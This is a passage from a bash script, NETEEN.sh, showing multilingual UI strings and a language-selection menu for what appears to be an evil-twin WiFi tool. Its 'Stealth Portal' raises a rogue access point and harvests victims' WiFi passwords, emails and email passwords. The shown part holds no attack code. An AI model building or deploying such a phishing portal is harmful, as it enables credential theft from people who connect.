    LANG_STRINGS["it",100]="Connettendosi, accetti i nostri termini di servizio"
    LANG_STRINGS["it",101]="Cambia Lingua"

    # Portuguese
    LANG_STRINGS["pt",1]="Portal Furtivo"
    LANG_STRINGS["pt",2]="Scanner de Rede"
    LANG_STRINGS["pt",3]="Sair"
    LANG_STRINGS["pt",4]="Selecionar plataforma:"
    LANG_STRINGS["pt",5]="macOS"
    LANG_STRINGS["pt",6]="Kali Linux"
    LANG_STRINGS["pt",7]="Selecionar idioma:"
    LANG_STRINGS["pt",8]="Inglês"
    LANG_STRINGS["pt",9]="Espanhol"
    LANG_STRINGS["pt",10]="Francês"
    LANG_STRINGS["pt",11]="Alemão"
    LANG_STRINGS["pt",12]="Italiano"
    LANG_STRINGS["pt",13]="Português"
    LANG_STRINGS["pt",14]="Russo"
    LANG_STRINGS["pt",15]="Chinês"
    LANG_STRINGS["pt",16]="Japonês"
    LANG_STRINGS["pt",17]="Árabe"
    LANG_STRINGS["pt",18]="Interfaces Disponíveis"
    LANG_STRINGS["pt",19]="Nenhuma interface wireless encontrada ou disponível"
    LANG_STRINGS["pt",20]="Selecionar interface"
    LANG_STRINGS["pt",21]="Selecionado:"
    LANG_STRINGS["pt",22]="Seleção inválida"
    LANG_STRINGS["pt",23]="Verificando dependências..."
    LANG_STRINGS["pt",24]="Pacotes faltando:"
    LANG_STRINGS["pt",25]="Instalando dependências..."
    LANG_STRINGS["pt",26]="Todas as dependências instaladas"
    LANG_STRINGS["pt",27]="Por favor execute como root: sudo ./NETEEN.sh"
    LANG_STRINGS["pt",28]="Iniciando Portal Furtivo..."
    LANG_STRINGS["pt",29]="Iniciando Scanner de Rede..."
    LANG_STRINGS["pt",30]="Escaneando redes..."
    LANG_STRINGS["pt",31]="Nenhuma interface wireless encontrada"
    LANG_STRINGS["pt",32]="Pressione Enter para continuar..."
    LANG_STRINGS["pt",33]="Nome SSID:"
    LANG_STRINGS["pt",34]="Configuração do Portal"
    LANG_STRINGS["pt",35]="Selecionar Tipo de Portal"
    LANG_STRINGS["pt",36]="Portal Padrão"
    LANG_STRINGS["pt",37]="Portal Personalizado"
    LANG_STRINGS["pt",38]="Selecionar tipo"
    LANG_STRINGS["pt",39]="Usando portal padrão"
    LANG_STRINGS["pt",40]="Selecionar Tema"
    LANG_STRINGS["pt",41]="Azul"
    LANG_STRINGS["pt",42]="Escuro"
    LANG_STRINGS["pt",43]="Verde"
    LANG_STRINGS["pt",44]="Vermelho"
    LANG_STRINGS["pt",45]="Roxo"
    LANG_STRINGS["pt",46]="Tema:"
    LANG_STRINGS["pt",47]="Título do Portal"
    LANG_STRINGS["pt",48]="Mensagem de Boas-vindas"
    LANG_STRINGS["pt",49]="Rótulo da Senha WiFi"
    LANG_STRINGS["pt",50]="Rótulo do Email"
    LANG_STRINGS["pt",51]="Rótulo da Senha do Email"
    LANG_STRINGS["pt",52]="Texto do Botão"
    LANG_STRINGS["pt",53]="Mensagem de Sucesso"
    LANG_STRINGS["pt",54]="Configurando interface..."
    LANG_STRINGS["pt",55]="Interface pronta"
    LANG_STRINGS["pt",56]="Iniciando ponto de acesso..."
    LANG_STRINGS["pt",57]="AP iniciado"
    LANG_STRINGS["pt",58]="Falha ao iniciar AP"
    LANG_STRINGS["pt",59]="Iniciando DHCP..."
    LANG_STRINGS["pt",60]="DHCP pronto"
    LANG_STRINGS["pt",61]="Configurando portal..."
    LANG_STRINGS["pt",62]="Portal pronto"
    LANG_STRINGS["pt",63]="Limpando..."
    LANG_STRINGS["pt",64]="Limpeza concluída"
    LANG_STRINGS["pt",65]="PORTAL ATIVO"
    LANG_STRINGS["pt",66]="Interface"
    LANG_STRINGS["pt",67]="Clientes"
    LANG_STRINGS["pt",68]="Status: Aguardando conexões"
    LANG_STRINGS["pt",69]="Pressione Ctrl+C para parar"
    LANG_STRINGS["pt",70]="CREDENCIAIS CAPTURADAS"
    LANG_STRINGS["pt",71]="Tempo"
    LANG_STRINGS["pt",72]="IP"
    LANG_STRINGS["pt",73]="Dispositivo"
    LANG_STRINGS["pt",74]="Senha WiFi"
    LANG_STRINGS["pt",75]="Email"
    LANG_STRINGS["pt",76]="Senha"
    LANG_STRINGS["pt",77]="Rede"
    LANG_STRINGS["pt",78]="Canal"
    LANG_STRINGS["pt",79]="Sinal"
    LANG_STRINGS["pt",80]="Obrigado por usar o NETEEN, até logo!"
    LANG_STRINGS["pt",81]="MENU PRINCIPAL"
    LANG_STRINGS["pt",82]="Até logo!"
    LANG_STRINGS["pt",83]="Selecionar opção"
    LANG_STRINGS["pt",84]="Iniciando Portal"
    LANG_STRINGS["pt",85]="RESULTADOS DA VERIFICAÇÃO DE REDE"
    LANG_STRINGS["pt",86]="Monitoramento de credenciais ativo..."
    LANG_STRINGS["pt",87]="Nota: Portal Furtivo no macOS tem funcionalidade limitada"
    LANG_STRINGS["pt",88]="Algumas funcionalidades podem não funcionar como esperado"
    LANG_STRINGS["pt",89]="Nota: A configuração da interface no macOS pode exigir configuração adicional"
    LANG_STRINGS["pt",90]="A funcionalidade completa requer Kali Linux"
    LANG_STRINGS["pt",91]="Para macOS, certifique-se de que as ferramentas wireless estão disponíveis"
    LANG_STRINGS["pt",92]="Você pode precisar instalar ferramentas adicionais manualmente"
    LANG_STRINGS["pt",93]="Utilitário airport não encontrado. Usando método de verificação alternativo..."
    LANG_STRINGS["pt",94]="Nota: A configuração de roteamento no macOS pode exigir configuração adicional"
    LANG_STRINGS["pt",95]="Selecionar plataforma"
    LANG_STRINGS["pt",96]="Selecionar idioma"
    LANG_STRINGS["pt",97]="Idioma definido:"
    LANG_STRINGS["pt",98]="Plataforma definida:"
    LANG_STRINGS["pt",99]="Plataforma detectada:"
    LANG_STRINGS["pt",100]="Ao conectar, você concorda com nossos termos de serviço"
    LANG_STRINGS["pt",101]="Alterar Idioma"

    # Russian
    LANG_STRINGS["ru",1]="Скрытый Портал"
    LANG_STRINGS["ru",2]="Сканер Сети"
    LANG_STRINGS["ru",3]="Выход"
    LANG_STRINGS["ru",4]="Выберите платформу:"
    LANG_STRINGS["ru",5]="macOS"
    LANG_STRINGS["ru",6]="Kali Linux"
    LANG_STRINGS["ru",7]="Выберите язык:"
    LANG_STRINGS["ru",8]="Английский"
    LANG_STRINGS["ru",9]="Испанский"
    LANG_STRINGS["ru",10]="Французский"
    LANG_STRINGS["ru",11]="Немецкий"
    LANG_STRINGS["ru",12]="Итальянский"
    LANG_STRINGS["ru",13]="Португальский"
    LANG_STRINGS["ru",14]="Русский"
    LANG_STRINGS["ru",15]="Китайский"
    LANG_STRINGS["ru",16]="Японский"
    LANG_STRINGS["ru",17]="Арабский"
    LANG_STRINGS["ru",18]="Доступные Интерфейсы"
    LANG_STRINGS["ru",19]="Беспроводные интерфейсы не найдены или недоступны"
    LANG_STRINGS["ru",20]="Выберите интерфейс"
    LANG_STRINGS["ru",21]="Выбрано:"
    LANG_STRINGS["ru",22]="Неверный выбор"
    LANG_STRINGS["ru",23]="Проверка зависимостей..."
    LANG_STRINGS["ru",24]="Отсутствующие пакеты:"
    LANG_STRINGS["ru",25]="Установка зависимостей..."
    LANG_STRINGS["ru",26]="Все зависимости установлены"
    LANG_STRINGS["ru",27]="Пожалуйста, запустите как root: sudo ./NETEEN.sh"
    LANG_STRINGS["ru",28]="Запуск Скрытого Портала..."
    LANG_STRINGS["ru",29]="Запуск Сканера Сети..."
    LANG_STRINGS["ru",30]="Сканирование сетей..."
    LANG_STRINGS["ru",31]="Беспроводной интерфейс не найден"
    LANG_STRINGS["ru",32]="Нажмите Enter для продолжения..."
    LANG_STRINGS["ru",33]="Имя SSID:"
    LANG_STRINGS["ru",34]="Конфигурация Портала"
    LANG_STRINGS["ru",35]="Выберите Тип Портала"
    LANG_STRINGS["ru",36]="Портал по Умолчанию"
    LANG_STRINGS["ru",37]="Пользовательский Портал"
    LANG_STRINGS["ru",38]="Выберите тип"
    LANG_STRINGS["ru",39]="Использование портала по умолчанию"
    LANG_STRINGS["ru",40]="Выберите Тему"
    LANG_STRINGS["ru",41]="Синий"
    LANG_STRINGS["ru",42]="Темный"
    LANG_STRINGS["ru",43]="Зеленый"
    LANG_STRINGS["ru",44]="Красный"
    LANG_STRINGS["ru",45]="Фиолетовый"
    LANG_STRINGS["ru",46]="Тема:"
    LANG_STRINGS["ru",47]="Название Портала"
    LANG_STRINGS["ru",48]="Приветственное сообщение"
    LANG_STRINGS["ru",49]="Метка Пароля WiFi"
    LANG_STRINGS["ru",50]="Метка Email"
    LANG_STRINGS["ru",51]="Метка Пароля Email"
    LANG_STRINGS["ru",52]="Текст Кнопки"
    LANG_STRINGS["ru",53]="Сообщение об Успехе"
    LANG_STRINGS["ru",54]="Настройка интерфейса..."
    LANG_STRINGS["ru",55]="Интерфейс готов"
    LANG_STRINGS["ru",56]="Запуск точки доступа..."
    LANG_STRINGS["ru",57]="ТД запущена"
    LANG_STRINGS["ru",58]="Не удалось запустить ТД"
    LANG_STRINGS["ru",59]="Запуск DHCP..."
    LANG_STRINGS["ru",60]="DHCP готов"
    LANG_STRINGS["ru",61]="Настройка портала..."
    LANG_STRINGS["ru",62]="Портал готов"
    LANG_STRINGS["ru",63]="Очистка..."
    LANG_STRINGS["ru",64]="Очистка завершена"
    LANG_STRINGS["ru",65]="ПОРТАЛ АКТИВЕН"
    LANG_STRINGS["ru",66]="Интерфейс"
    LANG_STRINGS["ru",67]="Клиенты"
    LANG_STRINGS["ru",68]="Статус: Ожидание подключений"
    LANG_STRINGS["ru",69]="Нажмите Ctrl+C для остановки"
    LANG_STRINGS["ru",70]="УЧЕТНЫЕ ДАННЫЕ ПОЛУЧЕНЫ"
    LANG_STRINGS["ru",71]="Время"
    LANG_STRINGS["ru",72]="IP"
    LANG_STRINGS["ru",73]="Устройство"
    LANG_STRINGS["ru",74]="Пароль WiFi"
    LANG_STRINGS["ru",75]="Email"
    LANG_STRINGS["ru",76]="Пароль"
    LANG_STRINGS["ru",77]="Сеть"
    LANG_STRINGS["ru",78]="Канал"
    LANG_STRINGS["ru",79]="Сигнал"
    LANG_STRINGS["ru",80]="Спасибо за использование NETEEN, до свидания!"
    LANG_STRINGS["ru",81]="ГЛАВНОЕ МЕНЮ"
    LANG_STRINGS["ru",82]="До свидания!"
    LANG_STRINGS["ru",83]="Выберите опцию"
    LANG_STRINGS["ru",84]="Запуск Портала"
    LANG_STRINGS["ru",85]="РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ СЕТИ"
    LANG_STRINGS["ru",86]="Мониторинг учетных данных активен..."
    LANG_STRINGS["ru",87]="Примечание: Скрытый Портал на macOS имеет ограниченную функциональность"
    LANG_STRINGS["ru",88]="Некоторые функции могут работать не так, как ожидалось"
    LANG_STRINGS["ru",89]="Примечание: Настройка интерфейса на macOS может потребовать дополнительной конфигурации"
    LANG_STRINGS["ru",90]="Полная функциональность требует Kali Linux"
    LANG_STRINGS["ru",91]="Для macOS убедитесь, что беспроводные инструменты доступны"
    LANG_STRINGS["ru",92]="Вам может потребоваться установить дополнительные инструменты вручную"
    LANG_STRINGS["ru",93]="Утилита airport не найдена. Использование альтернативного метода сканирования..."
    LANG_STRINGS["ru",94]="Примечание: Настройка маршрутизации на macOS может потребовать дополнительной конфигурации"
    LANG_STRINGS["ru",95]="Выберите платформу"
    LANG_STRINGS["ru",96]="Выберите язык"
    LANG_STRINGS["ru",97]="Язык установлен:"
    LANG_STRINGS["ru",98]="Платформа установлена:"
    LANG_STRINGS["ru",99]="Обнаруженная платформа:"
    LANG_STRINGS["ru",100]="Подключаясь, вы соглашаетесь с нашими условиями обслуживания"
    LANG_STRINGS["ru",101]="Изменить Язык"

    # Chinese
    LANG_STRINGS["zh",1]="隐蔽门户"
    LANG_STRINGS["zh",2]="网络扫描器"
    LANG_STRINGS["zh",3]="退出"
    LANG_STRINGS["zh",4]="选择平台:"
    LANG_STRINGS["zh",5]="macOS"
    LANG_STRINGS["zh",6]="Kali Linux"
    LANG_STRINGS["zh",7]="选择语言:"
    LANG_STRINGS["zh",8]="英语"
    LANG_STRINGS["zh",9]="西班牙语"
    LANG_STRINGS["zh",10]="法语"
    LANG_STRINGS["zh",11]="德语"
    LANG_STRINGS["zh",12]="意大利语"
    LANG_STRINGS["zh",13]="葡萄牙语"
    LANG_STRINGS["zh",14]="俄语"
    LANG_STRINGS["zh",15]="中文"
    LANG_STRINGS["zh",16]="日语"
    LANG_STRINGS["zh",17]="阿拉伯语"
    LANG_STRINGS["zh",18]="可用接口"
    LANG_STRINGS["zh",19]="未找到或无可用的无线接口"
    LANG_STRINGS["zh",20]="选择接口"
    LANG_STRINGS["zh",21]="已选择:"
    LANG_STRINGS["zh",22]="无效选择"
    LANG_STRINGS["zh",23]="检查依赖项..."
    LANG_STRINGS["zh",24]="缺少的软件包:"
    LANG_STRINGS["zh",25]="安装依赖项..."
    LANG_STRINGS["zh",26]="所有依赖项已安装"
    LANG_STRINGS["zh",27]="请以root权限运行: sudo ./NETEEN.sh"
    LANG_STRINGS["zh",28]="启动隐蔽门户..."
    LANG_STRINGS["zh",29]="启动网络扫描器..."
    LANG_STRINGS["zh",30]="扫描网络中..."
    LANG_STRINGS["zh",31]="未找到无线接口"
    LANG_STRINGS["zh",32]="按回车键继续..."
    LANG_STRINGS["zh",33]="SSID名称:"
    LANG_STRINGS["zh",34]="门户配置"
    LANG_STRINGS["zh",35]="选择门户类型"
    LANG_STRINGS["zh",36]="默认门户"
    LANG_STRINGS["zh",37]="自定义门户"
    LANG_STRINGS["zh",38]="选择类型"
    LANG_STRINGS["zh",39]="使用默认门户"
    LANG_STRINGS["zh",40]="选择主题"
    LANG_STRINGS["zh",41]="蓝色"
    LANG_STRINGS["zh",42]="深色"
    LANG_STRINGS["zh",43]="绿色"
    LANG_STRINGS["zh",44]="红色"
    LANG_STRINGS["zh",45]="紫色"
    LANG_STRINGS["zh",46]="主题:"
    LANG_STRINGS["zh",47]="门户标题"
    LANG_STRINGS["zh",48]="欢迎消息"
    LANG_STRINGS["zh",49]="WiFi密码标签"
    LANG_STRINGS["zh",50]="邮箱标签"
    LANG_STRINGS["zh",51]="邮箱密码标签"
    LANG_STRINGS["zh",52]="按钮文本"
    LANG_STRINGS["zh",53]="成功消息"
    LANG_STRINGS["zh",54]="设置接口..."
    LANG_STRINGS["zh",55]="接口就绪"
    LANG_STRINGS["zh",56]="启动接入点..."
    LANG_STRINGS["zh",57]="AP已启动"
    LANG_STRINGS["zh",58]="启动AP失败"
    LANG_STRINGS["zh",59]="启动DHCP..."
    LANG_STRINGS["zh",60]="DHCP就绪"
    LANG_STRINGS["zh",61]="设置门户..."
    LANG_STRINGS["zh",62]="门户就绪"
    LANG_STRINGS["zh",63]="清理中..."
    LANG_STRINGS["zh",64]="清理完成"
    LANG_STRINGS["zh",65]="门户激活"
    LANG_STRINGS["zh",66]="接口"
    LANG_STRINGS["zh",67]="客户端"
    LANG_STRINGS["zh",68]="状态: 等待连接"
    LANG_STRINGS["zh",69]="按Ctrl+C停止"
    LANG_STRINGS["zh",70]="凭据已捕获"
    LANG_STRINGS["zh",71]="时间"
    LANG_STRINGS["zh",72]="IP"
    LANG_STRINGS["zh",73]="设备"
    LANG_STRINGS["zh",74]="WiFi密码"
    LANG_STRINGS["zh",75]="邮箱"
    LANG_STRINGS["zh",76]="密码"
    LANG_STRINGS["zh",77]="网络"
    LANG_STRINGS["zh",78]="频道"
    LANG_STRINGS["zh",79]="信号"
    LANG_STRINGS["zh",80]="感谢使用NETEEN，再见！"
    LANG_STRINGS["zh",81]="主菜单"
    LANG_STRINGS["zh",82]="再见！"
    LANG_STRINGS["zh",83]="选择选项"
    LANG_STRINGS["zh",84]="启动门户"
    LANG_STRINGS["zh",85]="网络扫描结果"
    LANG_STRINGS["zh",86]="凭据监控激活..."
    LANG_STRINGS["zh",87]="注意：macOS上的隐蔽门户功能有限"
    LANG_STRINGS["zh",88]="某些功能可能无法按预期工作"
    LANG_STRINGS["zh",89]="注意：macOS上的接口设置可能需要额外配置"
    LANG_STRINGS["zh",90]="完整功能需要Kali Linux"
    LANG_STRINGS["zh",91]="对于macOS，请确保无线工具可用"
    LANG_STRINGS["zh",92]="您可能需要手动安装其他工具"
    LANG_STRINGS["zh",93]="未找到airport实用程序。使用替代扫描方法..."
    LANG_STRINGS["zh",94]="注意：macOS上的路由设置可能需要额外配置"
    LANG_STRINGS["zh",95]="选择平台"
    LANG_STRINGS["zh",96]="选择语言"
    LANG_STRINGS["zh",97]="语言设置为:"
    LANG_STRINGS["zh",98]="平台设置为:"
    LANG_STRINGS["zh",99]="检测到的平台:"
    LANG_STRINGS["zh",100]="连接即表示您同意我们的服务条款"
    LANG_STRINGS["zh",101]="更改语言"

    # Japanese
    LANG_STRINGS["ja",1]="ステルスポータル"
    LANG_STRINGS["ja",2]="ネットワークスキャナー"
    LANG_STRINGS["ja",3]="終了"
    LANG_STRINGS["ja",4]="プラットフォームを選択:"
    LANG_STRINGS["ja",5]="macOS"
    LANG_STRINGS["ja",6]="Kali Linux"
    LANG_STRINGS["ja",7]="言語を選択:"
    LANG_STRINGS["ja",8]="英語"
    LANG_STRINGS["ja",9]="スペイン語"
    LANG_STRINGS["ja",10]="フランス語"
    LANG_STRINGS["ja",11]="ドイツ語"
    LANG_STRINGS["ja",12]="イタリア語"
    LANG_STRINGS["ja",13]="ポルトガル語"
    LANG_STRINGS["ja",14]="ロシア語"
    LANG_STRINGS["ja",15]="中国語"
    LANG_STRINGS["ja",16]="日本語"
    LANG_STRINGS["ja",17]="アラビア語"
    LANG_STRINGS["ja",18]="利用可能なインターフェース"
    LANG_STRINGS["ja",19]="ワイヤレスインターフェースが見つからないか利用できません"
    LANG_STRINGS["ja",20]="インターフェースを選択"
    LANG_STRINGS["ja",21]="選択済み:"
    LANG_STRINGS["ja",22]="無効な選択"
    LANG_STRINGS["ja",23]="依存関係を確認中..."
    LANG_STRINGS["ja",24]="不足しているパッケージ:"
    LANG_STRINGS["ja",25]="依存関係をインストール中..."
    LANG_STRINGS["ja",26]="すべての依存関係がインストールされました"
    LANG_STRINGS["ja",27]="rootで実行してください: sudo ./NETEEN.sh"
    LANG_STRINGS["ja",28]="ステルスポータルを起動中..."
    LANG_STRINGS["ja",29]="ネットワークスキャナーを起動中..."
    LANG_STRINGS["ja",30]="ネットワークをスキャン中..."
    LANG_STRINGS["ja",31]="ワイヤレスインターフェースが見つかりません"
    LANG_STRINGS["ja",32]="Enterを押して続行..."
    LANG_STRINGS["ja",33]="SSID名:"
    LANG_STRINGS["ja",34]="ポータル設定"
    LANG_STRINGS["ja",35]="ポータルタイプを選択"
    LANG_STRINGS["ja",36]="デフォルトポータル"
    LANG_STRINGS["ja",37]="カスタムポータル"
    LANG_STRINGS["ja",38]="タイプを選択"
    LANG_STRINGS["ja",39]="デフォルトポータルを使用中"
    LANG_STRINGS["ja",40]="テーマを選択"
    LANG_STRINGS["ja",41]="青"
    LANG_STRINGS["ja",42]="ダーク"
    LANG_STRINGS["ja",43]="緑"
    LANG_STRINGS["ja",44]="赤"
    LANG_STRINGS["ja",45]="紫"
    LANG_STRINGS["ja",46]="テーマ:"
    LANG_STRINGS["ja",47]="ポータルタイトル"
    LANG_STRINGS["ja",48]="ウェルカムメッセージ"
    LANG_STRINGS["ja",49]="WiFiパスワードラベル"
    LANG_STRINGS["ja",50]="メールラベル"
    LANG_STRINGS["ja",51]="メールパスワードラベル"
    LANG_STRINGS["ja",52]="ボタンテキスト"
    LANG_STRINGS["ja",53]="成功メッセージ"
    LANG_STRINGS["ja",54]="インターフェースを設定中..."
    LANG_STRINGS["ja",55]="インターフェース準備完了"
    LANG_STRINGS["ja",56]="アクセスポイントを起動中..."
    LANG_STRINGS["ja",57]="AP起動済み"
    LANG_STRINGS["ja",58]="APの起動に失敗"
    LANG_STRINGS["ja",59]="DHCPを起動中..."
    LANG_STRINGS["ja",60]="DHCP準備完了"
    LANG_STRINGS["ja",61]="ポータルを設定中..."
    LANG_STRINGS["ja",62]="ポータル準備完了"
    LANG_STRINGS["ja",63]="クリーンアップ中..."
    LANG_STRINGS["ja",64]="クリーンアップ完了"
    LANG_STRINGS["ja",65]="ポータルアクティブ"
    LANG_STRINGS["ja",66]="インターフェース"
    LANG_STRINGS["ja",67]="クライアント"
    LANG_STRINGS["ja",68]="ステータス: 接続待機中"
    LANG_STRINGS["ja",69]="Ctrl+Cで停止"
    LANG_STRINGS["ja",70]="資格情報をキャプチャしました"
    LANG_STRINGS["ja",71]="時間"
    LANG_STRINGS["ja",72]="IP"
    LANG_STRINGS["ja",73]="デバイス"
    LANG_STRINGS["ja",74]="WiFiパスワード"
    LANG_STRINGS["ja",75]="メール"
    LANG_STRINGS["ja",76]="パスワード"
    LANG_STRINGS["ja",77]="ネットワーク"
    LANG_STRINGS["ja",78]="チャンネル"
    LANG_STRINGS["ja",79]="信号"
    LANG_STRINGS["ja",80]="NETEENをご利用いただきありがとうございます、さようなら！"
    LANG_STRINGS["ja",81]="メインメニュー"
    LANG_STRINGS["ja",82]="さようなら！"
    LANG_STRINGS["ja",83]="オプションを選択"
    LANG_STRINGS["ja",84]="ポータルを起動中"
    LANG_STRINGS["ja",85]="ネットワークスキャン結果"
    LANG_STRINGS["ja",86]="資格情報の監視がアクティブ..."
    LANG_STRINGS["ja",87]="注意：macOSでのステルスポータルは機能が制限されています"
    LANG_STRINGS["ja",88]="一部の機能は期待通りに動作しない場合があります"
    LANG_STRINGS["ja",89]="注意：macOSでのインターフェース設定には追加の設定が必要な場合があります"
    LANG_STRINGS["ja",90]="完全な機能にはKali Linuxが必要です"
    LANG_STRINGS["ja",91]="macOSの場合、ワイヤレストールが利用可能であることを確認してください"
    LANG_STRINGS["ja",92]="追加のツールを手動でインストールする必要があるかもしれません"
    LANG_STRINGS["ja",93]="airportユーティリティが見つかりません。代替のスキャン方法を使用しています..."
    LANG_STRINGS["ja",94]="注意：macOSでのルーティング設定には追加の設定が必要な場合があります"
    LANG_STRINGS["ja",95]="プラットフォームを選択"
    LANG_STRINGS["ja",96]="言語を選択"
    LANG_STRINGS["ja",97]="言語を設定:"
    LANG_STRINGS["ja",98]="プラットフォームを設定:"
    LANG_STRINGS["ja",99]="検出されたプラットフォーム:"
    LANG_STRINGS["ja",100]="接続することで、利用規約に同意したものとみなされます"
    LANG_STRINGS["ja",101]="言語を変更"

    # Arabic
    LANG_STRINGS["ar",1]="البوابة الخفية"
    LANG_STRINGS["ar",2]="ماسح الشبكة"
    LANG_STRINGS["ar",3]="خروج"
    LANG_STRINGS["ar",4]="اختر المنصة:"
    LANG_STRINGS["ar",5]="macOS"
    LANG_STRINGS["ar",6]="Kali Linux"
    LANG_STRINGS["ar",7]="اختر اللغة:"
    LANG_STRINGS["ar",8]="الإنجليزية"
    LANG_STRINGS["ar",9]="الإسبانية"
    LANG_STRINGS["ar",10]="الفرنسية"
    LANG_STRINGS["ar",11]="الألمانية"
    LANG_STRINGS["ar",12]="الإيطالية"
    LANG_STRINGS["ar",13]="البرتغالية"
    LANG_STRINGS["ar",14]="الروسية"
    LANG_STRINGS["ar",15]="الصينية"
    LANG_STRINGS["ar",16]="اليابانية"
    LANG_STRINGS["ar",17]="العربية"
    LANG_STRINGS["ar",18]="واجهات متاحة"
    LANG_STRINGS["ar",19]="لم يتم العثور على واجهات لاسلكية أو غير متاحة"
    LANG_STRINGS["ar",20]="اختر الواجهة"
    LANG_STRINGS["ar",21]="المحدد:"
    LANG_STRINGS["ar",22]="اختيار غير صالح"
    LANG_STRINGS["ar",23]="التحقق من التبعيات..."
    LANG_STRINGS["ar",24]="الحزم المفقودة:"
    LANG_STRINGS["ar",25]="جاري تثبيت التبعيات..."
    LANG_STRINGS["ar",26]="جميع التبعيات مثبتة"
    LANG_STRINGS["ar",27]="يرجى التشغيل كمسؤول: sudo ./NETEEN.sh"
    LANG_STRINGS["ar",28]="جاري تشغيل البوابة الخفية..."
    LANG_STRINGS["ar",29]="جاري تشغيل ماسح الشبكة..."
    LANG_STRINGS["ar",30]="جاري مسح الشبكات..."
    LANG_STRINGS["ar",31]="لم يتم العثور على واجهة لاسلكية"
    LANG_STRINGS["ar",32]="اضغط Enter للمتابعة..."
    LANG_STRINGS["ar",33]="اسم SSID:"
    LANG_STRINGS["ar",34]="تهيئة البوابة"
    LANG_STRINGS["ar",35]="اختر نوع البوابة"
    LANG_STRINGS["ar",36]="البوابة الافتراضية"
    LANG_STRINGS["ar",37]="بوابة مخصصة"
    LANG_STRINGS["ar",38]="اختر النوع"
    LANG_STRINGS["ar",39]="جاري استخدام البوابة الافتراضية"
    LANG_STRINGS["ar",40]="اختر السمة"
    LANG_STRINGS["ar",41]="أزرق"
    LANG_STRINGS["ar",42]="داكن"
    LANG_STRINGS["ar",43]="أخضر"
    LANG_STRINGS["ar",44]="أحمر"
    LANG_STRINGS["ar",45]="بنفسجي"
    LANG_STRINGS["ar",46]="السمة:"
    LANG_STRINGS["ar",47]="عنوان البوابة"
    LANG_STRINGS["ar",48]="رسالة الترحيب"
    LANG_STRINGS["ar",49]="تسمية كلمة مرور WiFi"
    LANG_STRINGS["ar",50]="تسمية البريد الإلكتروني"
    LANG_STRINGS["ar",51]="تسمية كلمة مرور البريد الإلكتروني"
    LANG_STRINGS["ar",52]="نص الزر"
    LANG_STRINGS["ar",53]="رسالة النجاح"
    LANG_STRINGS["ar",54]="جاري إعداد الواجهة..."
    LANG_STRINGS["ar",55]="الواجهة جاهزة"
    LANG_STRINGS["ar",56]="جاري تشغيل نقطة الوصول..."
    LANG_STRINGS["ar",57]="تم تشغيل نقطة الوصول"
    LANG_STRINGS["ar",58]="فشل في تشغيل نقطة الوصول"
    LANG_STRINGS["ar",59]="جاري تشغيل DHCP..."
    LANG_STRINGS["ar",60]="DHCP جاهز"
    LANG_STRINGS["ar",61]="جاري إعداد البوابة..."
    LANG_STRINGS["ar",62]="البوابة جاهزة"
    LANG_STRINGS["ar",63]="جاري التنظيف..."
    LANG_STRINGS["ar",64]="تم التنظيف"
    LANG_STRINGS["ar",65]="البوابة نشطة"
    LANG_STRINGS["ar",66]="الواجهة"
    LANG_STRINGS["ar",67]="العملاء"
    LANG_STRINGS["ar",68]="الحالة: في انتظار الاتصالات"
    LANG_STRINGS["ar",69]="اضغط Ctrl+C للإيقاف"
    LANG_STRINGS["ar",70]="تم التقاط بيانات الاعتماد"
    LANG_STRINGS["ar",71]="الوقت"
    LANG_STRINGS["ar",72]="IP"
    LANG_STRINGS["ar",73]="الجهاز"
    LANG_STRINGS["ar",74]="كلمة مرور WiFi"
    LANG_STRINGS["ar",75]="البريد الإلكتروني"
    LANG_STRINGS["ar",76]="كلمة المرور"
    LANG_STRINGS["ar",77]="الشبكة"
    LANG_STRINGS["ar",78]="القناة"
    LANG_STRINGS["ar",79]="الإشارة"
    LANG_STRINGS["ar",80]="شكرًا لاستخدامك NETEEN، وداعًا!"
    LANG_STRINGS["ar",81]="القائمة الرئيسية"
    LANG_STRINGS["ar",82]="وداعًا!"
    LANG_STRINGS["ar",83]="اختر الخيار"
    LANG_STRINGS["ar",84]="جاري تشغيل البوابة"
    LANG_STRINGS["ar",85]="نتائج مسح الشبكة"
    LANG_STRINGS["ar",86]="مراقبة بيانات الاعتماد نشطة..."
    LANG_STRINGS["ar",87]="ملاحظة: البوابة الخفية على macOS لها وظائف محدودة"
    LANG_STRINGS["ar",88]="قد لا تعمل بعض الميزات كما هو متوقع"
    LANG_STRINGS["ar",89]="ملاحظة: إعداد الواجهة على macOS قد يتطلب تهيئة إضافية"
    LANG_STRINGS["ar",90]="التكامل الكامل يتطلب Kali Linux"
    LANG_STRINGS["ar",91]="لـ macOS، يرجى التأكد من توفر أدوات اللاسلكي"
    LANG_STRINGS["ar",92]="قد تحتاج إلى تثبيت أدوات إضافية يدويًا"
    LANG_STRINGS["ar",93]="لم يتم العثور على أداة airport. استخدام طريقة مسح بديلة..."
    LANG_STRINGS["ar",94]="ملاحظة: إعداد التوجيه على macOS قد يتطلب تهيئة إضافية"
    LANG_STRINGS["ar",95]="اختر المنصة"
    LANG_STRINGS["ar",96]="اختر اللغة"
    LANG_STRINGS["ar",97]="تم تعيين اللغة:"
    LANG_STRINGS["ar",98]="تم تعيين المنصة:"
    LANG_STRINGS["ar",99]="المنصة المكتشفة:"
    LANG_STRINGS["ar",100]="بالاتصال، فإنك توافق على شروط الخدمة الخاصة بنا"
    LANG_STRINGS["ar",101]="تغيير اللغة"
}

# Get language string
get_str() {
    local key=$1
    echo "${LANG_STRINGS[$CURRENT_LANG,$key]:-${LANG_STRINGS[en,$key]}}"
}

# Language selection
select_language() {
    show_header
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════╗"
    echo "║              $(get_str 7)                  ║"
    echo "╠════════════════════════════════════════════╣"
    echo "║  1) $(get_str 8)                           ║"
    echo "║  2) $(get_str 9)                           ║"
    echo "║  3) $(get_str 10)                          ║"
    echo "║  4) $(get_str 11)                          ║"
    echo "║  5) $(get_str 12)                          ║"
    echo "║  6) $(get_str 13)                          ║"
    echo "║  7) $(get_str 14)                          ║"
    echo "║  8) $(get_str 15)                          ║"
    echo "║  9) $(get_str 16)                          ║"
    echo "║  10) $(get_str 17)                         ║"
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    while true; do
        read -p "$(echo -e ${YELLOW}"$(get_str 96) [1-10]: "${NC})" lang_choice
        
        case $lang_choice in
            1) CURRENT_LANG="en"; break ;;
            2) CURRENT_LANG="es"; break ;;
            3) CURRENT_LANG="fr"; break ;;
            4) CURRENT_LANG="de"; break ;;
            5) CURRENT_LANG="it"; break ;;
            6) CURRENT_LANG="pt"; break ;;
            7) CURRENT_LANG="ru"; break ;;
